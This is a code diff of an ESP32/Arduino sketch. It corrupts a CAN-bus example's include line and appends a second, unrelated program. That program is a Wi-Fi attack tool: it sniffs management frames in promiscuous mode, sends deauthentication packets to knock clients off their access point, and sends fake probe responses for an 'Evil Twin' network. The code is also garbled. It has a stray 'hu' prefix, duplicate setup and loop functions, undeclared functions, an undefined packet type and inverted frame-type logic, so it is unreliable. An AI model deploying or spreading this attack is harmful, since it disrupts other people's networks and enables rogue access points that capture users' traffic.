@@ -1,4 +1,4 @@
-#include <CAN.h>
+hu#include <CAN.h>
 
 void setup() {
   Serial.begin(115200);
@@ -26,4 +26,99 @@ void loop() {
   }
 
   delay(1000);  // Wait before sending the next message
+}
+#include <WiFi.h>
+#include <esp_wifi.h>
+
+#define TARGET_SSID "Target_SSID"  // The SSID you want to spoof
+#define DEAUTH_REASON 0x07         // Reason for deauthentication
+
+// Promiscuous mode callback function
+void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return; // Only handle management packets
+
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    wifi_ieee80211_packet_t *ieee_pkt = (wifi_ieee80211_packet_t *)pkt->payload;
+
+    // Extract source MAC address (client) and destination MAC (AP)
+    uint8_t *src_mac = ieee_pkt->hdr.addr2;  // Source MAC (client)
+    uint8_t *dst_mac = ieee_pkt->hdr.addr1;  // Destination MAC (AP)
+    
+    // Print captured MAC addresses for debugging
+    Serial.printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
+
+    // Example: If a probe request is detected, send a deauth or fake AP response
+    if (pkt->payload[0] == 0x40) {  // 0x40 is a Probe Request frame type
+        Serial.println("Probe Request Detected!");
+
+        // Send Deauthentication to disconnect client from the AP
+        sendDeauthPacket(src_mac, dst_mac); // Send deauth packet to the client
+    }
+
+    // If you want to spoof a probe response to create an Evil Twin, do it here.
+    if (pkt->payload[0] == 0x50) { // Probe Response frame type (Optional)
+        Serial.println("Sending Probe Response (Evil Twin)");
+        sendFakeAPResponse(src_mac); // Send fake probe response
+    }
+}
+
+// Function to send Deauthentication packet
+void sendDeauthPacket(uint8_t *targetMac, uint8_t *apMac) {
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00, // Frame control (Deauthentication)
+        0x3A, 0x01, // Duration
+        targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],  // Target MAC
+        apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],  // AP MAC
+        apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],  // BSSID
+        0x00, 0x00, // Sequence number
+        DEAUTH_REASON // Reason code
+    };
+
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    Serial.println("Deauthentication Packet Sent!");
+}
+
+// Function to send Fake AP response (Evil Twin)
+void sendFakeAPResponse(uint8_t *targetMac) {
+    uint8_t fakeAPPacket[128] = {
+        0x50, 0x00, 0x00, 0x00, // Probe response frame control
+        0x00, 0x00, 0x00, 0x00, // Duration and other fields
+        targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],  // Client MAC
+        0x02, 0x03, 0x04, 0x05, 0x06, 0x07,  // Fake AP MAC
+        targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],  // Fake AP BSSID
+        0x00, 0x00, // Sequence number
+        0x64, 0x00, // Beacon interval and capability info
+        0x01, 0x04  // Supported rates (example)
+    };
+
+    // Add SSID of the fake AP
+    const char* fakeSSID = "FakeNetwork"; // Name of your fake SSID
+    int ssidLen = strlen(fakeSSID);
+    fakeAPPacket[37] = ssidLen; // Set SSID length
+    memcpy(&fakeAPPacket[38], fakeSSID, ssidLen);
+
+    // Send the fake probe response
+    esp_wifi_80211_tx(WIFI_IF_AP, fakeAPPacket, sizeof(fakeAPPacket), false);
+    Serial.println("Fake AP Probe Response Sent!");
+}
+
+void setup() {
+    Serial.begin(115200);
+
+    // Set Wi-Fi mode to Station and Access Point
+    WiFi.mode(WIFI_AP_STA);
+
+    // Disable any existing Wi-Fi connection
+    WiFi.disconnect();
+
+    // Enable promiscuous mode
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+
+    Serial.println("Promiscuous Mode Enabled!");
+}
+
+void loop() {
+    // Nothing in loop; all action happens in promiscuous_callback
 }
